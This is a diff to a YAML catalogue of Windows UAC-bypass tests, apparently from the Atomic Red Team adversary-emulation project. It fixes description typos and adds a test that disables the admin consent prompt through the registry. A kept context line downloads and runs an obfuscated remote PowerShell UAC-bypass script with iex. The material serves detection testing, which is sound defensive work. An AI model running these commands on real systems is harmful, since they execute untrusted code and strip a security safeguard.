@@ -5,7 +5,7 @@ atomic_tests:
   auto_generated_guid: 5073adf8-9a50-4bd9-b298-a9bd2ead8af9
   description: |
     Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
-    Upon execution command prompt should be launched with administrative privelages
+    Upon execution command prompt should be launched with administrative privileges. 
   supported_platforms:
   - windows
   input_arguments:
@@ -24,7 +24,7 @@ atomic_tests:
   auto_generated_guid: a6ce9acf-842a-4af6-8f79-539be7608e2b
   description: |
     PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
-    Upon execution command prompt should be launched with administrative privelages
+    Upon execution command prompt should be launched with administrative privalages
   supported_platforms:
   - windows
   input_arguments:
@@ -598,3 +598,22 @@ atomic_tests:
     command: |-
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')
     name: powershell
+- name: Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key
+  auto_generated_guid: 251c5936-569f-42f4-9ac2-87a173b9e9b8
+  description: |
+    Disable User Account Conrol (UAC) for admin by setting the registry key 
+    HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin to 0.
+    
+    [MedusaLocker Ransomware](https://cloudsek.com/technical-analysis-of-medusalocker-ransomware/), 
+    [Purple Fox Rootkit](https://blogs.blackberry.com/en/2022/01/threat-thursday-purple-fox-rootkit), 
+    [Avaddon Ransomware](https://blogs.blackberry.com/en/2021/06/threat-thursday-avaddon-ransomware-uses-ddos-attacks-as-triple-threat)
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $orgValue =(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin
+      Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force
+    cleanup_command: |
+      Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value $orgValue -Type Dword -Force
+    name: powershell
+    elevation_required: true
